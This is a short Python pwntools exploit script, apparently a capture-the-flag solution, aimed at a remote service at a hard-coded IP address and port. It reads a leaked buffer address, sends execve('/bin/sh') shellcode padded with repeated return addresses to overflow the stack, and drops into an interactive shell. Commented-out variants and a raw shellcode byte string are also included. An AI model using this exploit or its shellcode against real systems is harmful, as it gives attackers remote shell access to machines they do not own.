from pwn import *
context.log_level="debug"
context.arch = 'i386'

p = remote("3.238.30.178", 3002)

# p.recvuntil("function: 0x")
ret = 0x08049216
# test=0x08049595
# info(str(hex(ret)))

# shell=asm(shellcraft.sh())
# s2=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
bin = hex(u32(b"/bin"))
sh=hex(u32(b"/sh\0"))
"""
shell=asm("\n".join([
'xor eax, eax',
'mov al, 0x0b',
f'push {sh}',
f'push {bin}',
'mov ebx, esp',
'xor ecx, ecx',
'xor edx, edx'
'int 0x80'
]))
"""
shell = f'''
xor eax,eax
mov al,0xb
push {sh}
push {bin}
mov ebx, esp
xor ecx,ecx
xor edx,edx
int 0x80
'''
shell = asm(shell)

print(shell)

# test=asm("""X:
# jmp X
# """)

p.recvuntil("at 0x")
buf = int(p.recv(8).ljust(8, b"\x00"),16)
info(str(hex(buf)))

p.sendlineafter(": ", shell+b"AA"+p32(buf)*(50-len(shell)))
# p.sendlineafter(": ", shell+b"A"+p32(buf)*(51-len(s2)))
# p.sendlineafter(": ", test+p32(buf)*(52-len(test)))
p.interactive() 

